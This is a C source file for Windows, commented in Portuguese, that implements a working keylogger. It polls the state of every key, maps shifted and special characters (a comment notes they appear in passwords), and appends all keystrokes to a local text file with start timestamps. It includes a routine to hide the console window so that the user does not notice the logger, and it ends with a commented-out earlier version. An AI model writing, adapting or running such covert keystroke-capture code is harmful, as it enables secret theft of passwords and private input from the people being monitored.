#include<stdio.h>
#include<windows.h>
#include <time.h>

//versao 4 funcionando! algumas teclas ainda nao estao mapeadas 

void esconderTela(int x); // função para esconder a tela e o incone na barra de tarefas 
						  // para q o usuario nao perceba q o keylogger esta sendo executado 
void marcarTempo(FILE *arq, char arquivo[]); // grava a data e a hora que o keylogger começa a executar 
int main(){
	int chave,chaveFinal[0xFF];
	int capsLock,numLock,shiftEsq,shiftDir;
	int processado;
	char teste;
	char especial_1[] = ")!@#$%^&*(";
	char especial_2[] = ";=,-./`";
	char especial_3[] = ":+<_>?~";
	char especial_4[] = "[\\]\';";
	char especial_5[] = "{|}\"";
	FILE *dados_teclado;
	char arquivo[] = "dados_teclado.txt";
	
	esconderTela(0);
	
	marcarTempo(dados_teclado, arquivo);
	
	for(chave = 0;chave<0xFF;chave++){
		chaveFinal[chave] = 0;
	}
	
	
	while(1){
		
		Sleep(10);
		
		
		
		shiftEsq = (GetKeyState(0xA0)&0xFF00) > 0 ? 1:0; // shift para esquerda 
		shiftDir = (GetKeyState(0xA1)&0xFF00) > 0 ? 1:0; // shift para direita 
		numLock = (GetKeyState(0x90)&0xFF) > 0 ? 1:0; // testa se numLock esta ativo
		capsLock = (GetKeyState(0x14)&0xFF) > 0 ? 1:0; // testa se capsLock esta ativo
		
		
		for(chave = 0;chave<0xFF;chave++){
			
			processado = (GetKeyState(chave)&0xFF00)>0?1:0;
			teste = (char)chave;
			
			if(processado == 1 && chaveFinal[chave] == 0){
				
				// character a-z e A-Z
				if(chave >= 0x41 && chave <= 0x5A){
					if(capsLock == 0){
						if(shiftEsq == 0 && shiftDir == 0){
							teste = (char)(chave+0x20);
						}
					}
					else if(shiftEsq == 1 || shiftDir == 1){
						teste = (char)(chave+0x20);
					}
				}
				
				//numeros
				else if(chave >= 0x30 && chave <= 0x39){
					if(shiftEsq == 1 || shiftDir == 1){
						teste = especial_1[chave-0x30];
					}
				}
				
				//numeros com numlook ativado
				else if(chave >= 0x60 && chave <= 0x69 && numLock == 1){
					teste = (char)(chave-0x30);
				}
				
				// aqui começam os testes de character especiais 
				// que que sao !@#$%¨&*()_+ entre outros podem ser usados em senhas
				else if(chave >= 0xBA && chave <= 0xC0){
					if(shiftEsq == 1 || shiftDir == 1){
						teste = especial_3[chave-0xBA];
					}
					else{
						teste = especial_2[chave-0xBA];
					}
				}
				else if(chave >= 0xDB && chave <= 0xDF){
					if(shiftEsq == 1 || shiftDir == 1){
						teste = especial_5[chave-0xDB];
					}
					else{
						teste = especial_4[chave-0xDB];
					}					
				}
				
				else if(chave == 0x0D){
					teste = (char)0x0A;
				}
				else if(chave >= 0x6A && chave <= 0x6F){
					teste = (char)(chave-0x40);
				}
				else if(chave != 0x20 && chave != 0x09){
					teste = (char)0x00;
				}
				
				
				if(teste != (char)0x00){
					printf("%c",teste);
					dados_teclado = fopen(arquivo,"a");
					putc(teste,dados_teclado);
					fclose(dados_teclado);
				}				
				
			}

			chaveFinal[chave] = processado;
		}		
		
		
	}
}


void esconderTela(int x){ // se o parametro for 1 a tela fica escondida, se for 0 a tela vai aparecer no monitor
	if(x == 1){
		HWND window;
		AllocConsole();
		window=FindWindowA("ConsoleWindowClass",NULL);
		ShowWindow(window,0);
	}
}

void marcarTempo (FILE *arq, char arquivo[]){ // o ponteiro para o arquivo e passado por parametro para que a função possa gravar no arquivo

	time_t tempo;
    struct tm *tempoS;
    tempo = time(NULL);
    tempoS = localtime( &tempo );
	
	arq = fopen("arq.txt","a");
	fprintf(arq,"\n%d/%d/%d - %d:%d:%d\n",tempoS->tm_mday, tempoS-> tm_mon+1, tempoS->tm_year-100, tempoS->tm_hour, tempoS->tm_min, tempoS->tm_sec );
	fclose(arq);
}




/*#include<windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<conio.h>
#include<string.h>
#include<time.h>
int chekEspecial1(FILE *arq, int tecla);
int main(){
	int teclas, resultado; //1º guarga a tecle digitada
	                      //2º guarda o resultado da verificaçao
	time_t tempo;
    struct tm *tempoS;
    tempo = time(NULL);
    tempoS = localtime( &tempo );
    
	//HWND window;
	//AllocConsole();
	//window=FindWindowA("ConsoleWindowClass",NULL);
	//ShowWindow(window,0);
	
	
	
	
	
	FILE *arq;
	arq = fopen("arq.txt","a");
	fprintf(arq,"\n%d/%d/%d - %d:%d:%d\n",tempoS->tm_mday, tempoS-> tm_mon+1, tempoS->tm_year-100, tempoS->tm_hour, tempoS->tm_min, tempoS->tm_sec );
	fclose(arq);
	while(1){
		for(teclas=0; teclas<=255; teclas++){
			
			resultado = GetAsyncKeyState(teclas);
			
			if(resultado == -32767){
				arq = fopen("arq.txt", "a"); // fopen() funçao utilizada para abrir o arquivo
				printf(" tecla= %d", teclas);
				fprintf(arq,"%c", teclas);
				fclose(arq);
				
			}
			/*else{
				int res;
				teclas = getch();
				res = chekEspecial1(arq,teclas); 
				if(res = 1){
					continue;
				}
			}
			
			
		}
	}
	
	                      
	return 0;
}

//passa o ponteiro para

int chekEspecial1(FILE *arq, int tecla){ 

	int result = 1; // se gravar no arquivo retorna 1
	
	printf("tecla = %d", tecla); // remover para entrega
	// aqui imprime o valor de combinaçoes de tecla (nao é necessario imprimir na tela!!)
	
	arq = fopen("arq.txt","a"); // abre o aquivo para que possa gravar
		
	switch(tecla){
		case 71: // HOME
			fprintf(arq,"%s", "HOME ");
			break;
		case 72: //Seta para cima
			fprintf(arq,"%s", "SETA PARA CIMA ");
            break;
		case 73: // PAGE UP
			fprintf(arq,"%s", "PAGE UP ");
        	break;
    	case 75: //Seta para esquerda
    		fprintf(arq,"%s","SETA PARA ESQUERDA ");
            break;
		case 77: //Seta para direita
			fprintf(arq,"%s","SETA PARA A DIREITA");
            break;
        case 79: // END
        	fprintf(arq,"%s","END ");
            break;
        case 80: //Seta para baixo
        	fprintf(arq,"%s","SETA PARA BAIXO");
            break;
        case 81: // PAGE DOWN
        	fprintf(arq,"%s","PAGE DOWN ");
            break;
    	case 82: // INSERT
    		fprintf(arq,"%s","INSERT");
            break;
 		case 83: // DELETE
 			fprintf(arq,"%s","DELETE");
            break;
        case 59: // F1
        	fprintf(arq,"%s","F1 ");
            break;
        case 60: // F2
        	fprintf(arq,"%s","F2");
            break;
        case 61: // F3
        	fprintf(arq,"%s","F3");
            break;
        case 62: // F4
        	fprintf(arq,"%s","F4");
            break;
        case 63: // F5
        	fprintf(arq,"%s","F5");
            break;
        case 64: // F6
        	fprintf(arq,"%s","F6");
            break;
        case 65: // F7
        	fprintf(arq,"%s","F7");
            break;
        case 66: // F8
        	fprintf(arq,"%s","F8");
            break;
        case 67: // F9
        	fprintf(arq,"%s","F9");
            break;
        case 68: // F10
        	fprintf(arq,"%s","F11");
            break;
        case 104: // ALT + F1
        	fprintf(arq,"%s","ALT+F1");
            break;
        case 105: // ALT + F2
        	fprintf(arq,"%s","ALT+F2");
            break;
        case 106: // ALT + F3
        	fprintf(arq,"%s","ALT+F3");
            break;
        case 107: // ALT + F4
        	fprintf(arq,"%s","ALT+F4");
            break;
        case 108: // ALT + F5
        	fprintf(arq,"%s","ALT+F5");
            break;
        case 109: // ALT + F6
        	fprintf(arq,"%s","ALT+F6");
            break;
        case 110: // ALT + F7
        	fprintf(arq,"%s","ALT+F7");
            break;
        case 111: // ALT + F8
        	fprintf(arq,"%s","ALT+F8");
            break;
        case 112: // ALT + F9
        	fprintf(arq,"%s","ALT+F9");
            break;
        case 113: // ALT + F10
        	fprintf(arq,"%s","ALT+F10");
            break;		
		default:
    		result = 0; // SE NAO FOR ENCONTRADO NENHUMA DESSAS TECLAS RETORNA 0 PARA A FUNÇÃO PRINCIPAL
    		break;
    	
	}
	fclose(arq); // FECHA O ARQUIVO APOS A GRAVAÇÃO!!
	return result;
	
}

*/


















